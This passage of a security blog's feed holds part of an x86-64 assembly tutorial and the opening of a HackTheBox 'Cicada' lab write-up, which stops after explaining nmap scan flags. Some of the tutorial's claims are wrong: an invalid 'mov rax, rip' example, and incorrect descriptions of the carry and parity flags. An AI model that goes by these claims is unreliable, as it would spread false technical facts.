&lt;p&gt;&lt;code&gt;.text&lt;/code&gt; section holds all assembly instructions and loads them to the &lt;code&gt;text&lt;/code&gt; memory segment. Once all instructions are loaded, then the processor starts executing them in order.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;text&lt;/code&gt; segment within the memory is read-only, so we cannot write any variables within it.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;data&lt;/code&gt; section is read/write, which is why we write our variables to it.&lt;/p&gt;

&lt;h2 id=&#34;assembly-basic-instructions&#34;&gt;
  Assembly basic instructions
  &lt;a href=&#34;#assembly-basic-instructions&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;h3 id=&#34;moving-data-around&#34;&gt;
  Moving data around
  &lt;a href=&#34;#moving-data-around&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Data movement is one of the fundamental instructions in any assembly program. The main &lt;code&gt;Data Movement&lt;/code&gt; instructions are:&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Instruction&lt;/th&gt;
          &lt;th&gt;Explanation&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;mov&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Move data or load immediate data&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;mov rax, rip&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;lea&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Load an address pointing to the value&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;lea rax, [rsp+5]&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;xchg&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Swap data between two registers or addresses&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;xchg rax,rbx&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&#34;example-1-moving-data-to-a-register&#34;&gt;
  Example 1: moving data to a register
  &lt;a href=&#34;#example-1-moving-data-to-a-register&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;assembly&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;global _start

section .text
_start:
 mov rax, 0 ; move value 0 to rax
 mov rbx, 1 ; move value 1 to rbx
 mov al, 1  ; move 1-byte into a 1-byte register(al) &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;assembling &lt;code&gt;asm.s&lt;/code&gt; using &lt;code&gt;nasm&lt;/code&gt; &lt;code&gt;nasm -f elf64 asm.s &amp;amp;&amp;amp; objdump -M intel -d asm.o&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&#34;example-2-moving-pointer-values&#34;&gt;
  Example 2: moving pointer values
  &lt;a href=&#34;#example-2-moving-pointer-values&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;assembly&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;global _start

section .text
_start:
 mov rax, rsp
 mov rax, [rsp]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Square brackets &lt;code&gt;[]&lt;/code&gt; tells &lt;code&gt;nasm&lt;/code&gt; to move whatever the value is at address &lt;code&gt;rsp&lt;/code&gt; to &lt;code&gt;rax&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&#34;example-3-loading-value-pointers-using-lea&#34;&gt;
  Example 3: Loading value pointers using lea
  &lt;a href=&#34;#example-3-loading-value-pointers-using-lea&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;global _start

section .text
_start:
 lea rax, [rsp+10] ; loads rsp+10 address space to rax
 mov rax, [rsp+10] ; loads value at rsp+10 address space to rax&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&#34;arithmetic-instructions&#34;&gt;
  Arithmetic Instructions
  &lt;a href=&#34;#arithmetic-instructions&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Arithmetic instructions are split in &lt;code&gt;Unary&lt;/code&gt; and &lt;code&gt;Binary&lt;/code&gt; operands.&lt;/p&gt;

&lt;h4 id=&#34;unary&#34;&gt;
  Unary
  &lt;a href=&#34;#unary&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Unary instruction take only one argument&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Instruction&lt;/th&gt;
          &lt;th&gt;Explanation&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;inc&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Increment by 1&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;inc rax&lt;/code&gt; = &lt;code&gt;rax++&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;dec&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Decrement by 1&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;dec rax&lt;/code&gt; = &lt;code&gt;rax--&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&#34;binary&#34;&gt;
  Binary
  &lt;a href=&#34;#binary&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Binary instruction, namely takes two arguments&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Instruction&lt;/th&gt;
          &lt;th&gt;Explanation&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;add&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Add both operands&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;add rax, rbx&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;sub&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Subtract Source from Destination &lt;code&gt;rax = rax - rbx&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;sub rax, rbx&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;imul&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Multiply both operands&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;imul rax, rbx&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;result is always stored in the destination register. source stays intact.&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&#34;bitwise&#34;&gt;
  Bitwise
  &lt;a href=&#34;#bitwise&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Bitwise instructions work on the bit level&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Instruction&lt;/th&gt;
          &lt;th&gt;Explanation&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;not&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Bitwise NOT(inverts all bits)&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;not rax&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;and&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Bitwise AND(if both bits are 1 -&amp;gt; 1, if both 0 -&amp;gt; 0)&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;and rax, rbx&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;or&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Bitwise OR(if either is 1-&amp;gt;1, if both 0-&amp;gt;0)&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;or rax, rbx&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;xor&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Bitwise XOR(if bits are the same -&amp;gt; 0. if different -&amp;gt; 1)&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;xor rax, rbx&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;global _start

section .text
_start:
    xor rax, rax ; 0
    xor rbx, rbx; 0
    add rbx, 15; rbx = 0x0F
    xor rbx, 15; 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;program-control-instructions&#34;&gt;
  Program Control Instructions
  &lt;a href=&#34;#program-control-instructions&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Control instructions allows to change the flow of the program and direct it to another line. We have &lt;code&gt;Directives&lt;/code&gt;, &lt;code&gt;Loops&lt;/code&gt;, &lt;code&gt;Branching&lt;/code&gt;, &lt;code&gt;Function Calls&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;loops&#34;&gt;
  Loops
  &lt;a href=&#34;#loops&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;A loop in assembly is a set of instructions that repeat for &lt;code&gt;rcx&lt;/code&gt; times.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;global _start

section .text
_start:
        xor rax, rax ; rax = 0
        xor rbx, rbx ; rbx = 0
        inc rbx      ; rbx = 1
        mov rcx, 10  ; loop 10 times

loopFib:
        add rax, rbx ; get the next number
        xchg rax, rbx; swap values
        loop loopFib ; &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the example above &lt;code&gt;rcx&lt;/code&gt; register in &lt;code&gt;mov rcx, 10&lt;/code&gt; is a general-purpose register, but for &lt;code&gt;loop&lt;/code&gt; it has a special purpose.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;loop&lt;/code&gt; checks &lt;code&gt;rcx&lt;/code&gt; value each time that loop block executes and decreases &lt;code&gt;rcx&lt;/code&gt; value each time. This loop runs until &lt;code&gt;rcx&lt;/code&gt; is 0.&lt;/p&gt;
&lt;p&gt;How does &lt;code&gt;loopFib&lt;/code&gt; gets executed? &lt;code&gt;loopFib:&lt;/code&gt; is just a label which gets translated to an address of &lt;code&gt;add rax, rbx&lt;/code&gt; at runtime. While &lt;code&gt;loop loopFib&lt;/code&gt; tells assembly where to jump at each iteration. This &lt;code&gt;loop&lt;/code&gt; instruction checks that &lt;code&gt;rcx&lt;/code&gt;&amp;gt;0 value before executing another loop.&lt;/p&gt;

&lt;h3 id=&#34;branching&#34;&gt;
  Branching
  &lt;a href=&#34;#branching&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Branching allows &lt;code&gt;jump&lt;/code&gt;-ing to any location in the program if a condition is met. The most basic branching instruction is &lt;code&gt;jmp&lt;/code&gt; which will always be triggered no matter the conditions.&lt;/p&gt;
&lt;p&gt;An example&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;assembly&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;global  _start

section .text
_start:
    xor rax, rax    ; initialize rax to 0
    xor rbx, rbx    ; initialize rbx to 0
    inc rbx         ; increment rbx to 1
    mov rcx, 10
loopFib:
    add rax, rbx    ; get the next number
    xchg rax, rbx   ; swap values
    jmp loopFib&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In this example, even though &lt;code&gt;mov rcx, 10&lt;/code&gt; is present, it won&amp;rsquo;t affect &lt;code&gt;jmp loopFib&lt;/code&gt; because &lt;code&gt;jmp&lt;/code&gt; is an unconditional instruction and will continue running the loop forever.&lt;/p&gt;

&lt;h4 id=&#34;conditional-branching&#34;&gt;
  Conditional Branching
  &lt;a href=&#34;#conditional-branching&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Instruction&lt;/th&gt;
          &lt;th&gt;Explanation&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;jz&lt;/td&gt;
          &lt;td&gt;DST == 0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;jnz&lt;/td&gt;
          &lt;td&gt;DST != 0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;js&lt;/td&gt;
          &lt;td&gt;DST &amp;lt; 0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;jns&lt;/td&gt;
          &lt;td&gt;DST &amp;gt;= 0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;jg&lt;/td&gt;
          &lt;td&gt;DST &amp;gt; SRC&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;jge&lt;/td&gt;
          &lt;td&gt;DST &amp;gt;= SRC&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;jl&lt;/td&gt;
          &lt;td&gt;DST &amp;lt; SRC&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;jle&lt;/td&gt;
          &lt;td&gt;DST &amp;lt;= SRC&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Branching is not only done with jumping. It can also be combined with other instructions like &lt;code&gt;mov&lt;/code&gt; with &lt;code&gt;CMOVcc&lt;/code&gt; and &lt;code&gt;SETcc&lt;/code&gt;.&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;An example of &lt;code&gt;mov rax, rbx&lt;/code&gt; but on the condition of &lt;code&gt;== 0&lt;/code&gt; &lt;code&gt;cmovz rax, rbx&lt;/code&gt; Similarly for &lt;code&gt;&amp;lt;&lt;/code&gt; &lt;code&gt;cmovl rax, rbx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Similarly for &lt;code&gt;set&lt;/code&gt; &lt;code&gt;setz rax&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&#34;rflags&#34;&gt;
  RFLAGS
  &lt;a href=&#34;#rflags&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;RFLAGS(are 64-bit) register sets the necessary flags to either &lt;code&gt;0&lt;/code&gt; or &lt;code&gt;1&lt;/code&gt; depending a certain condition is met. For example, if &lt;code&gt;sub&lt;/code&gt; instruction resulted in a negative value, then the SIGN FLAG &lt;code&gt;SF&lt;/code&gt; will be set to &lt;code&gt;1&lt;/code&gt;. If &lt;code&gt;dec&lt;/code&gt; instruction resulted in &lt;code&gt;0&lt;/code&gt;, then ZERO FLAG &lt;code&gt;ZF&lt;/code&gt; will be set to &lt;code&gt;1&lt;/code&gt; and so on.&lt;/p&gt;
&lt;p&gt;There are several &lt;code&gt;RFLAGS&lt;/code&gt; that are present in assembly programs, each with its own flag bit.&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Bit location&lt;/th&gt;
          &lt;th&gt;Label&lt;/th&gt;
          &lt;th&gt;Explanation&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;CF&lt;/td&gt;
          &lt;td&gt;Carry Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Reserved&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;PF&lt;/td&gt;
          &lt;td&gt;Parity Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Reserved&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4&lt;/td&gt;
          &lt;td&gt;AF&lt;/td&gt;
          &lt;td&gt;Auxiliary Carry Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;5&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Reserved&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;6&lt;/td&gt;
          &lt;td&gt;ZF&lt;/td&gt;
          &lt;td&gt;Zero Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;7&lt;/td&gt;
          &lt;td&gt;SF&lt;/td&gt;
          &lt;td&gt;Sign Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;8&lt;/td&gt;
          &lt;td&gt;TF&lt;/td&gt;
          &lt;td&gt;Trap Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;9&lt;/td&gt;
          &lt;td&gt;IF&lt;/td&gt;
          &lt;td&gt;Interrupt Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;10&lt;/td&gt;
          &lt;td&gt;DF&lt;/td&gt;
          &lt;td&gt;Direction Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;11&lt;/td&gt;
          &lt;td&gt;OF&lt;/td&gt;
          &lt;td&gt;Overflow Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;12-13&lt;/td&gt;
          &lt;td&gt;IOPL&lt;/td&gt;
          &lt;td&gt;I/O Privilege Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;14&lt;/td&gt;
          &lt;td&gt;NT&lt;/td&gt;
          &lt;td&gt;Nested Task&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;15&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Reserved&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;16&lt;/td&gt;
          &lt;td&gt;RF&lt;/td&gt;
          &lt;td&gt;Resume Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;17&lt;/td&gt;
          &lt;td&gt;VM&lt;/td&gt;
          &lt;td&gt;Virtual-x64 Mode&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;18&lt;/td&gt;
          &lt;td&gt;AC&lt;/td&gt;
          &lt;td&gt;Access Control&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;19&lt;/td&gt;
          &lt;td&gt;VIF&lt;/td&gt;
          &lt;td&gt;Virtual Interrupt Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;20&lt;/td&gt;
          &lt;td&gt;VIP&lt;/td&gt;
          &lt;td&gt;Virtual Interrupt Pending&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;21&lt;/td&gt;
          &lt;td&gt;ID&lt;/td&gt;
          &lt;td&gt;Identification Flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;22-63&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Reserved&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;code&gt;RFLAGS&lt;/code&gt; - 64 bit &lt;code&gt;EFLAGS&lt;/code&gt; - 32 bit &lt;code&gt;FLAGS&lt;/code&gt; - 16 bit&lt;/p&gt;
&lt;p&gt;Important flags&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Carry Flag &lt;code&gt;CF&lt;/code&gt;: Indicates whether we have a float.&lt;/li&gt;
&lt;li&gt;The Parity Flag &lt;code&gt;PF&lt;/code&gt;: Indicates whether a number is odd or even.&lt;/li&gt;
&lt;li&gt;The Zero Flag &lt;code&gt;ZF&lt;/code&gt;: Indicates whether a number is zero.&lt;/li&gt;
&lt;li&gt;The Sign Flag &lt;code&gt;SF&lt;/code&gt;: Indicates whether a register is negative.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;assembly&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;global  _start

section .text
_start:
    xor rax, rax    ; initialize rax to 0
    xor rbx, rbx    ; initialize rbx to 0
    inc rbx         ; increment rbx to 1
loopFib:
    add rax, rbx    ; get the next number
    xchg rax, rbx   ; swap values
    cmp rbx, 10  ; do rbx - 10
    js loopFib  ; jump if result is &amp;lt;0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;in the example above, &lt;code&gt;cmp&lt;/code&gt; instruction has been added. All it does is subtract second argument from first and set necessary flags in RFLAGS register. Then jump instruction checks flag condition and continues accordingly. In this case after first number is calculated &lt;code&gt;cmp rbx, 10&lt;/code&gt; will result in &lt;code&gt;-9&lt;/code&gt;. &lt;code&gt;js&lt;/code&gt; will continue loop since its condition is &lt;code&gt;UNTIL DST &amp;lt; 0&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;functions&#34;&gt;
  Functions
  &lt;a href=&#34;#functions&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;h3 id=&#34;the-stack&#34;&gt;
  The Stack
  &lt;a href=&#34;#the-stack&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;The Stack is a segment of memory allocated for each program to store data in. It is used to temporarily store and retrieve data. Top of the stack is referred by the Top Stack Pointer &lt;code&gt;rsp&lt;/code&gt; and bottom is referred as Base Stack Pointer &lt;code&gt;rbp&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Data can either be &lt;code&gt;push&lt;/code&gt;ed or &lt;code&gt;pop&lt;/code&gt;&amp;rsquo;d from the stack. &lt;code&gt;push&lt;/code&gt; Copies the specified register/address to the top of the stack. &lt;code&gt;pop&lt;/code&gt; moves the item at the top of the stat to the specified register/address.&lt;/p&gt;
&lt;p&gt;The stack has Last-in First-out (LIFO) design. This means we can only &lt;code&gt;pop&lt;/code&gt; out the element that is at the top of the stack. If we &lt;code&gt;push&lt;/code&gt; five more elements on top of it, we&amp;rsquo;ll have to pop all of them before accessing that last element.&lt;/p&gt;
&lt;p&gt;Before calling &lt;code&gt;functions&lt;/code&gt; or &lt;code&gt;syscalls&lt;/code&gt; we need to save data to the stack. Otherwise the data will be lost. For example if we wanted to retain the current value at &lt;code&gt;rax&lt;/code&gt; and run a syscall, we would first &lt;code&gt;push rax&lt;/code&gt; to the stack and then call the function.&lt;/p&gt;
&lt;p&gt;Using the stack is very simple. The only thing we should keep in mind is the order we push our registers and the state of the stack to safely restore our data and not restore a different value by pop when a different value is at the top of the stack.&lt;/p&gt;
</content>
    </item>
    <item>
      <title>HackTheBox Machine - Cicada</title>
      <link>http://localhost:1313/research/htb-cicada-analysis/</link>
      <pubDate>Wed, 20 Nov 2024 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/research/htb-cicada-analysis/</guid>
      <description>&lt;p&gt;IP: 10.10.11.35&lt;/p&gt;
&lt;p&gt;Nmap scan results for 10.10.11.35 machine. &lt;/p&gt;
&lt;p&gt;Parameters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;`sV` - Probe open ports to determine service/version info&lt;/li&gt;
&lt;li&gt;&amp;lsquo;sC&amp;rsquo; - equivalent to &amp;ndash;script=default&lt;/li&gt;
&lt;li&gt;&amp;lsquo;Pn&amp;rsquo; - Treat all hosts as online &amp;ndash; skip host discovery&lt;/li&gt;
&lt;li&gt;&amp;lsquo;&amp;ndash;max-rate=1000&amp;rsquo; - Send packets no faster than 1000 packets per second&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
